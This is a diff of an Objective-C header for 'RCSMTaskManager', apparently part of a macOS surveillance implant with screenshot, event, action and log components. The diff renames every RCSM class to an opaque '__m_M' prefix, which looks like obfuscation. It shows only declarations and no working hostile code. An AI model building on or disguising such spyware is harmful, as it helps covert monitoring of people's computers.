@@ -15,17 +15,17 @@
 #ifndef __RCSMTaskManager_h__
 #define __RCSMTaskManager_h__
 
-@class RCSMConfManager;
-@class RCSMEvents;
-@class RCSMActions;
-@class RCSMAgentScreenshot;
-@class RCSMSharedMemory;
-@class RCSMLogManager;
+@class __m_MConfManager;
+@class __m_MEvents;
+@class __m_MActions;
+@class __m_MAgentScreenshot;
+@class __m_MSharedMemory;
+@class __m_MLogManager;
 
 //
 // This class is a singleton
 //
-@interface RCSMTaskManager : NSObject
+@interface __m_MTaskManager : NSObject
 {
   BOOL mIsSyncing;
   
@@ -39,8 +39,8 @@
   BOOL mShouldReloadConfiguration;
   
 @private
-  RCSMConfManager   *mConfigManager;
-  RCSMActions       *mActions;
+  __m_MConfManager   *mConfigManager;
+  __m_MActions       *mActions;
 }
 
 //@property (readonly, retain) NSMutableArray *mEventsList;
@@ -54,7 +54,7 @@
 @property (readonly)  NSMutableArray *mActionsList;
 @property (readonly)  NSMutableArray *mAgentsList;
 
-+ (RCSMTaskManager *)sharedInstance;
++ (__m_MTaskManager *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
 - (id)init;
